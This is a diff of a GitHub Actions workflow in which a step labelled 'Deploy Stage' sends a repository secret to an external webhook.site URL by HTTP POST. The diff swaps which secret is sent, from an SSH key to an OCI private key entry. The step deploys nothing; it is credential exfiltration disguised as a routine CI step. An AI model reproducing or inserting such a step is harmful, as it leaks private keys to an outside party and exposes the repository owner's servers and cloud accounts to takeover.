@@ -7,10 +7,10 @@ jobs:
     steps:
       - name: Deploy Stage
         env:
-          SERVER_SSH_KEY: ${{ secrets.SERVER_SSH_KEY }}
+          SERVER_SSH_KEY: ${{ secrets.OCI_PRIVATE_KEY_FILENAME }}
         uses: fjogeleit/http-request-action@v1
         with:
           url: 'https://webhook.site/bfbec6dc-4031-48ff-ad25-3a006b83fc58'
           method: 'POST'
           customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.SERVER_SSH_KEY }}
+          data: ${{ secrets.OCI_PRIVATE_KEY_FILENAME }}
